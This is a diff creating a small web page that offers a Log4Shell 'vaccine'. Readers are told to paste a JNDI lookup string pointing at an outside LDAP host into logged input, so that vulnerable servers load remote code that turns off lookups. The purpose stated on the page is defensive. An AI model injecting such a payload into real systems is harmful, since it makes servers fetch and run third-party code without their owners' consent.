@@ -1,5 +1,45 @@
 <html>
 <head>
-	<meta http-equiv="refresh" content="0;url=https://github.com/Cybereason/Logout4Shell"/>
+	<title>Patch log4j via RCE</title>
+	<style>
+		body {
+			font-family: sans-serif;
+			width: 500px;
+			margin-left: 25%;
+		}
+		article {
+			width: 50em;
+			line-height: 200%;
+		}
+	</style>
 </head>
+<body>
+<article>
+	<h1>Patch log4j via RCE</h1>
+
+	<h2>Why?</h2>
+	<a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">Log4Shell</a>.
+
+	<h2>How?</h2>
+	On this server, the project <a href="https://github.com/Cybereason/Logout4Shell">https://github.com/Cybereason/Logout4Shell</a>
+	is deployed and disables the JNDI Lookup by running a RCE with a patch.
+
+	Just paste the following entry into a "problematic" field/logged user input, and be save until the next restart:
+	<pre>
+${jndi:ldap://log4j-fix.de/a}
+</pre>
+
+	The change is not persistent and logs <code>Setting FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS value to True</code>, if
+	the patch was successful.
+
+	<h2>Who?</h2>
+	<div class="address">
+		Ideas in Logic - Hardwareentwicklung,<br>
+		Wolfgang Jung & Jan Kesten GbR<br>
+		Marie-Calm-Str. 3<br>
+		DE-34131 Kassel<br>
+		<a href="mailto:w.jung@ideas-in-logic.de">contact me</a>
+	</div>
+</article>
+</body>
 </html>
